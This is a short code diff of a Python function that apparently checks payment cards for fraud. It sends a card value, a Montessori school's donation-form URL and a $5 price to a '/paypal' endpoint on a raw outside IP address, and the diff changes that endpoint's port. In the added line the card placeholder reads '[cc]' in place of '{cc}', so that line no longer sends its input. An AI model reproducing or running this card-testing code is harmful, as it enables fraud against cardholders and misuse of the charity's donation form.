@@ -3,5 +3,5 @@ def chkk(ccx):
 	cc=ccx.strip()
 	urll="https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=5"
 	price="5"
-	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
+	res=requests.get(f'http://151.247.197.54:5000/paypal?cc=[cc]&url={urll}&price={price}').text
 	return res
